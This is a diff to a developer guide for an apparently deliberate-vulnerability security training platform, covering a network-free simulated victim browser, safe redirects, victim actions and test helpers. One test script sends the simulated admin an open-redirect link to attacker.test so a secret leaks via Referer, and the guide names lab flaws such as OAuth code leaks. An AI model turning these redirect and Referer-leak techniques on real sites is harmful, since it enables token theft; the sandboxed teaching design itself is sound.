@@ -107,6 +107,8 @@ case (g)). Divine resists every exploit.
 | `simWorld({ mailboxes })`, `world.browser(handler)` | `core/sim` | victim-driven labs: one player's inbox, attacker log and the victim's browser, made inside the lab's `perSession` factory (section 8) |
 | `defineChallenge({ victim: { sim, actions } })`, `VICTIM_LABELS` | `core/registry`, `core/sim` | the victim's buttons (`POST <lab>/victim/<name>`, 303 back) and the inbox / attacker-log panel under every lab page (section 8) |
 | `classifySimUrl(url, base?)`, `labHref(u, base, level)` | `core/sim` | where a URL really takes the victim's browser (`citadel` / `attacker` / `other`); a citadel URL as a link into the lab (section 8) |
+| `checkMailAction({ browser, mailbox, link?, rearm })`, `sendLinkAction(browserFor, { rearm })` | `core/sim` | the two usual victim actions, with a required re-arm step at the start of each (section 8) |
+| `sendSimRedirect(res, location, status?)` | `core/sim` | a real route answering a level's redirect: a citadel URL goes to the same place in the lab, anything else gets a "your browser would go to ..." page, never a real redirect off the lab (section 8) |
 
 `req.level` on a challenge route is already clamped to the implemented levels;
 `req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
@@ -197,7 +199,8 @@ fully attacker-chosen SQL must also cap result size.
   An optional `dispose(value)` runs when an instance is evicted or expires (to
   release a resource; its errors are swallowed). The bound is per `perSession`
   holder, so the worst case is `maxEntries` x the number of stateful labs: fine
-  for a loopback single-player lab.
+  for a loopback single-player lab. Holders that keep simulated-victim state share one smaller, process-wide
+  budget instead (section 8).
   **Eviction and TTL expiry are a reset** (counters, locks and secrets are rebuilt), so a lab with limiters must
   survive neither: (a) `idleTtlMs` must exceed the longest lock or lockout the lab uses (the default 26 h is
   longer than the 24 h cap of the Divine escalating locks; never lower it for such a lab); (b) creating
@@ -395,9 +398,17 @@ If a mutation stays green, the matrix is missing a case.
 
 Some flaws need someone else to click: the admin opens a reset mail whose link host came from a header (GK-09),
 follows an OAuth authorize link while signed in (GK-10, GK-11), signs in through a session link (GK-16). The engine
-simulates that victim deterministically and with **no real network**: nothing in `core/sim.ts` opens a socket,
-resolves a name or fetches (a guard test in `tests/sim.spec.ts` checks the imports and spies on fetch, http, https,
-net and dns during a visit). The worked example is the fixture lab SV-01 in `tests/sim-lab.spec.ts`.
+simulates that victim deterministically and with **no real network**: nothing in `core/sim/` opens a socket,
+resolves a name or fetches. A guard in `tests/sim.spec.ts` parses every module in `core/sim/` with the TypeScript
+compiler and allows only a fixed list of runtime imports (no dynamic `import()`, `require` or network globals such as
+`fetch` or `globalThis`; transitively they reach only `node:buffer` and `node:fs`), spies on fetch, http(s), http2,
+tls, net, dgram and dns during a visit, and spies on `net.Socket.prototype.connect` for the whole spec file. The worked
+example is the fixture lab SV-01 in `tests/sim-lab.spec.ts`.
+
+Import everything from `core/sim.ts`, a barrel over the pure simulation in `core/sim/` (`limits.ts`: `SIM_LIMITS` and
+the copying clip; `url.ts`: the hosts and `classifySimUrl`; `cookies.ts`: the jar; `browser.ts`: `SimBrowser`;
+`world.ts`: `simWorld`, `simInbox`, `attackerLog`; no Express at runtime) and the engine side in `core/victim.ts`
+(`VictimConfig`, the presets, the panel, `mountVictim`, `sendSimRedirect`).
 
 ### The two hosts
 
@@ -433,25 +444,44 @@ hand-written parser); the classifier is the ground truth for where the victim's 
   real ones and never sent to attacker.test; `cookies.set()` signs the victim in up front. Every citadel request calls
   `handler(req: SimRequest): SimResponse` synchronously: `req` has `method`, `url`, `path`, `query`
   (URLSearchParams), lower-case `headers`, `cookies` and form `body` (null prototypes; `field()` and `header()` work on
-  it); the response is `{ status, headers?, body? }`, where `Location` (3xx), `Set-Cookie`, `Refresh` and
-  `Referrer-Policy` are honoured. At most 10 redirects; the same request again with the jar unchanged is a loop.
+  it); the response is `{ status, headers?, body? }`, where `Location` (followed on 301, 302, 303, 307 and 308 only:
+  any other status, a 300 or 304 with a Location included, is a page), `Set-Cookie`, `Refresh` and `Referrer-Policy`
+  are honoured. At most 10 redirects; the same request again with the jar unchanged is a loop.
 - **Referer, as real browsers send it**: a link opened from mail has none; `follow(url, { referrer })` is a click on a
-  citadel page. **A 3xx keeps the referrer of the page that started the navigation** (an open redirect does not leak
+  citadel page. **A redirect keeps the referrer of the page that started the navigation** (an open redirect does not leak
   its own URL). **A citadel page that moves the browser on by itself sends its own URL**: answer
   `200` with `Refresh: 0; url=<next>` (the stand-in for a meta refresh or a script; the sim does not parse HTML).
   `Referrer-Policy` on that page (or on a redirect) applies; the default is the legacy full URL
   (`no-referrer-when-downgrade`). The Referer never carries userinfo or a fragment, and nothing ever comes FROM attacker.test.
   So an OAuth code leaks through `Referer` only from a page that forwards (GK-10 Inquisitor: the callback page moves on
   to `next=`), and Divine can stop it (`Referrer-Policy: no-referrer`, no secrets in URLs, no open forward).
-- **Limits** (`SIM_LIMITS`): URL 2048 chars, 10 redirects, 8 mailboxes of 10 mails (subject 200, body 2000, 3 links),
-  30 log entries, 20 cookies of 4096 bytes, 5 visits, notes of 500 chars.
+- **Limits** (`SIM_LIMITS`): URL 2048 chars, 10 redirects, 3 mailboxes (the player's included) of 10 mails (subject 200,
+  body 2000, 3 links), 30 log entries, 20 cookies of 4096 bytes, 5 visits (page bodies kept to 2000 chars), notes of
+  500 chars. **Every stored field is a copy** (or a constant): a clipped field, a mail's `to` (the mailbox's own
+  address, never the padded input), every URL the browser keeps, cookie names, values and paths, Referers. A trimmed,
+  lower-cased, split or matched string, a URL getter or a query value can be a view that keeps its whole parent (a
+  100 KB form field, a long fragment) alive, so the sim never stores one.
 
 ### All victim state goes through `perSession`
 
 `simWorld()`, `simInbox()`, `attackerLog()` and `world.browser()` throw unless called inside a `perSession` factory, so
-victim state is always per player and level, bounded, and inherits the new-instance limits. Keep the world and the
-victim's browser in the lab's own per-session state, next to whatever else the lab tracks (accounts, tokens, codes),
-so one eviction or one `reset` drops all of it together:
+victim state is always per player and level, bounded, and inherits the new-instance limits. They also cap the holder
+whose factory creates them (`capPerSessionHolder` in `core/lab.ts`), because a filled world is up to about a megabyte
+and the container has 512 MB:
+
+- **One budget for the whole process.** Every holder that keeps sim state (directly, or through a nested holder whose
+  instance it keeps), in every lab and at every level, shares `SIM_LIMITS.worldsTotal` (150) instances in all (about
+  100-170 MB at worst). Creating one at the budget evicts the
+  least recently used of them, whichever lab it belongs to; the new one is never refused. Adding a victim-driven lab
+  does not raise the bound. A lab's own `maxEntries` still applies within it.
+- **Eviction is a reset** of that player's instance at that level (section 4), and a shared budget turns over in
+  minutes: keep no limiter, lockout or attempt budget in victim-driven state.
+- At most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute per holder, by default and as a ceiling: a lab may
+  pass a lower `maxNewPerMinute`, never higher (asking for more fails at the first factory run).
+- Tests may shrink the budget with `setCappedBudget(n)` from `core/lab.ts` (restore the value it returns).
+
+Keep the world and the victim's browser in the lab's own per-session state, next to whatever else the lab tracks
+(accounts, tokens, codes), so one eviction or one `reset` drops all of it together:
 
 ```ts
 // model.ts
@@ -469,13 +499,15 @@ export const labFor = (req: { sessionId: string; level: Level }) => labs.for(req
 ### How levels plug in
 
 The handler is the lab seen from the victim's browser. It dispatches on `r.path` and calls **the same level functions
-the real routes call**, so the flaw lives in `levels/*.ts` once and View Source and the Diff tell the whole story:
+the real routes call**, so the flaw lives in `levels/*.ts` once and View Source and the Diff tell the whole story.
+Paths are twins: `http://citadel.test/<path>` is the real route `<labPath>/<path>`, so the handler and the router
+use the same path for the same page (`/idp/authorize` in both examples below):
 
 ```ts
 // challenge.ts (or model.ts)
 function citadel(level: Level, state: LabState, r: SimRequest): SimResponse {
   const impl = byLevelImpl.for(level);
-  if (r.path === '/authorize') return impl.authorize(state, r.query, r.cookies.pid_session); // { status: 302, headers: { Location } }
+  if (r.path === '/idp/authorize') return impl.authorize(state, r.query, r.cookies.pid_session, ''); // { status: 302, headers: { Location } }
   if (r.path === '/reset') return { status: 200, body: 'Choose a new password' };
   return { status: 404, body: 'Not found' };
 }
@@ -486,25 +518,69 @@ never HTTP). Links the lab builds for mails are sim URLs (`http://citadel.test/r
 flawed level put there); the panel turns citadel links in the player's own mailbox into "open in lab" links
 (`labHref`), and shows every other link as text.
 
-### Scripting the victim
+**Where the lab lives is a parameter.** One level function answers both browsers, the player's at
+`/d/<district>/<slug>/...` and the victim's at `http://citadel.test/...`, so it never hard-codes either: it takes a
+`base` and builds every lab-local `Location` (`${base}/idp/login`) and cookie `Path` (`base || '/'`) from it. Real
+routes pass `labPath(res)`; the citadel handler passes `''` (use `CITADEL_ORIGIN` where a sim URL must be absolute, e.g.
+a link in a mail or a registered `redirect_uri`). A hard-coded `Path=/d/...` never matches in the victim's jar (its
+requests are for `/callback`), and a hard-coded `/callback` leaves the lab on a real route.
+
+**A real route never answers a sim URL with `res.redirect`.** URLs that are data (the registered
+`http://citadel.test/callback`, a player's `redirect_uri` or `next=`) are sim URLs: the player's own browser cannot reach
+citadel.test, and `res.redirect(redirect_uri)` from a lab route would be a REAL open redirect off the loopback lab.
+Answer a level's 3xx with `sendSimRedirect(res, location, status?)`: a citadel URL (or a path under `labPath(res)`)
+goes to the same place in the lab at the served level (the IdP's `302 http://citadel.test/callback?code=...` becomes
+`302 <lab>/callback?code=...&level=<level>`); anything else (attacker.test, another host, `javascript:`) gets a page
+that shows the URL as text and says that in this lab the simulated victim's browser goes there. It never links to it.
+An empty or blank Location (an empty `redirect_uri`) gets a "this redirect has no target" page, never a redirect to
+the route itself.
 
 ```ts
+router.get('/idp/authorize', async (req, res) => { // the twin of http://citadel.test/idp/authorize, in the player's own browser
+  const params = new URLSearchParams(req.originalUrl.split('?')[1] ?? '');
+  const out = impl.for(req.level).authorize(labFor(req), params, req.cookies.pid_session, labPath(res));
+  const location = out.headers?.Location;
+  if (typeof location === 'string') return sendSimRedirect(res, location); // never res.redirect(location)
+  await sendPage(res, view('consent'), { message: out.body ?? '' });
+});
+```
+
+### Scripting the victim
+
+The two usual actions are presets; use them unless the victim's script is different:
+
+```ts
+/** The admin starts every action signed in to Pilgrim-ID, whatever the player's last link did. */
+const rearm = (req: Request, admin: SimBrowser) => { admin.cookies.set('pid_session', adminSession(labFor(req))); };
+
 register(defineChallenge({
   /* id, district, slug, dir, title, summary, maps, levels, hints, mount */
   victim: {
     sim: (req) => labFor(req).world,
     actions: [
-      { name: 'check-mail', label: VICTIM_LABELS.checkMail, run: (req) => {
-          const s = labFor(req);
-          const link = s.world.inbox.newest(ADMIN_MAILBOX)?.links[0];
-          if (link === undefined) return 'The admin has no new mail.'; // an optional note for the panel (English)
-          s.admin.follow(link);
-      } },
-      { name: 'send-link', label: VICTIM_LABELS.sendLink, input: 'url',
-        run: (req, { url }) => { labFor(req).admin.follow(url); } },
+      // opens the newest mail in its mailbox and clicks links[link] (default 0), from a mail client (no Referer)
+      checkMailAction({ browser: (req) => labFor(req).admin, mailbox: ADMIN_MAILBOX, rearm }),
+      // opens whatever link the player types in (input: 'url')
+      sendLinkAction((req) => labFor(req).admin, { rearm, description: { id: '...', en: 'opens any link you send, while signed in to Pilgrim-ID' } }),
     ],
   },
 }));
+```
+
+Both take `name`, `label`, `description` (platform defaults fit) and a REQUIRED `rearm`; `checkMailAction` answers with a
+bilingual note when the mailbox is empty or the newest mail has no such link. A custom action is
+`{ name, label, description?, input?: 'url', run: (req, { url }) => note | void }`:
+
+```ts
+{ name: 'open-inbox', label: { id: 'Minta admin membuka kotak masuk', en: 'Ask the admin to open the inbox' },
+  description: { id: 'membuka /inbox dan mengklik tautan pertama di sana', en: 'opens /inbox and clicks the first link on it' },
+  run: (req) => {
+    const s = labFor(req);
+    rearm(req, s.admin);
+    const link = firstLinkOn(s.admin.follow('http://citadel.test/inbox').page?.body ?? '');
+    if (link === undefined) return { id: 'Kotak masuk admin kosong.', en: "The admin's inbox is empty." };
+    s.admin.follow(link, { referrer: 'http://citadel.test/inbox' }); // a click on a citadel page: pass its URL
+  } },
 ```
 
 The engine mounts `POST <lab>/victim/<name>?level=<level>` per action **before** the lab's own routes (the
@@ -512,10 +588,28 @@ The engine mounts `POST <lab>/victim/<name>?level=<level>` per action **before**
 500), and answers 303 back to `<lab>?level=<level>`, so the forms work without JavaScript. Under every lab page
 rendered with `sendPage` the layout adds the panel: the two hosts, one form per action (the link field keeps the last
 link sent), "What the victim's browser did" (the note, and per visit its outcome and request count, **never its
-URLs**: they can carry the very secret the lab is about), **the player's mailbox only**, and "Your server
-(attacker.test) received…". Platform strings are bilingual; everything else is escaped. The only way a victim-side
+URLs**: they can carry the very secret the lab is about; only the visits made during the last action, numbered within
+it, the last 5 shown; a `run` that throws is shown as failed and its error goes to the error handler), **the player's
+mailbox only**, and "Your server (attacker.test) received…". Platform strings are bilingual; everything else is escaped. The only way a victim-side
 secret may reach the player is the lab's flaw (the attacker log, or a stolen session): never echo the victim's pages
 or the admin's mail anywhere else. Labels: `VICTIM_LABELS.checkMail` / `.sendLink`, or a lab `Text`.
+
+- **`description`** (optional `Text`) is shown under the button: the victim's script in a few words ("opens the newest
+  mail and clicks its first link", "opens any link you send, while signed in to Pilgrim-ID").
+- **The note carries what the summary cannot show.** The panel summarises each visit by outcome and request count only,
+  so it cannot say *why* nothing happened: "the admin was not signed in", "the admin has no new mail", "the reset link
+  had expired". `run` returns that note as `Text` (player guidance, shown in the player's language) or, rarely, a plain
+  string (lab content, shown as-is); either is clipped to 500 chars. Anything else is a programming error (500).
+- **A click on a citadel page passes `referrer` explicitly**: `follow(link, { referrer: 'http://citadel.test/inbox' })`.
+  Without it the request carries no Referer, as for a link opened from a mail client, and a Referer-based lab would
+  silently test nothing.
+- **Re-arm the victim at the start of every action.** The player's link can undo the victim's standing state: a link
+  to `/logout`, or a page whose `Set-Cookie`s overflow the 20-cookie jar and evict the admin's session. A lab without
+  Restart would then stay stuck until the 26 h TTL. The presets require `rearm` (call it first in a custom `run`): it
+  restores that state by setting cookies (`browser.cookies.set`), as the factory did, and never browses (a visit would
+  show in the report). Re-arm only the standing state, never what the exploit itself changes. A victim with no
+  standing state (nobody signed in, nothing to restore) passes an explicit no-op, `rearm: () => {}`, so the choice is
+  made on purpose and a forgotten re-arm is an error, not a lab that silently gets stuck.
 
 Restart: a victim-driven lab whose state can get stuck may pass `reset: (req) => labs.reset(req)`; that drops the
 world (inbox, attacker log, victim cookies) with the rest. The usual rule applies: no Restart on a lab with limiters.
@@ -529,14 +623,18 @@ resists with its usual answer. See SV-01 in `tests/sim-lab.spec.ts`:
 ```ts
 const exploit: Script = async (agent, level) => {
   await agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: 'http://citadel.test/continue?next=http://attacker.test/x' });
-  const page = await agent.get(`${LAB}?level=${level}&lang=en`);
-  const key = referers(page.text).map((r) => new URL(r).searchParams.get('key')).find(Boolean) ?? 'none';
+  const page = await agent.get(`${LAB}?level=${level}`);
+  const ref = attackerHits(page.text).find((h) => h.url === 'http://attacker.test/x')?.referer;
+  const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
   return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
 };
 ```
 
-Parse the panel's escaped HTML (`Referer: <code>...</code>`, `<code>GET http://attacker.test/...</code>`) and unescape
-`&amp;` before using a URL. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
+Read the page as the player would, with the helpers in `tests/helpers.ts`: `attackerHits(html)` parses the panel's
+attacker log (one `{ seq, at, method, url, referer?, body? }` per `<li data-seq>`, unescaped, oldest first, like
+`world.attackerLog.entries()`), `referers(html)` lists the Referers, `panelOf(html)` cuts out the panel and
+`unescapeHtml(s)` undoes the escaped output tag. They read only the panel's log, never the lab's own content or the
+mailbox, in either language. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
 `.attackerLog.entries()`, `.inbox.list(ADMIN_MAILBOX)`, `.now = () => t` for timestamps and expiry). `describeLabView`
 works unchanged (it skips the panel's `sim-action` forms). Add the lab-specific cases: the victim's secret never
 appears on the page except through the flaw, players and levels are isolated, the legit victim flow ends on a citadel
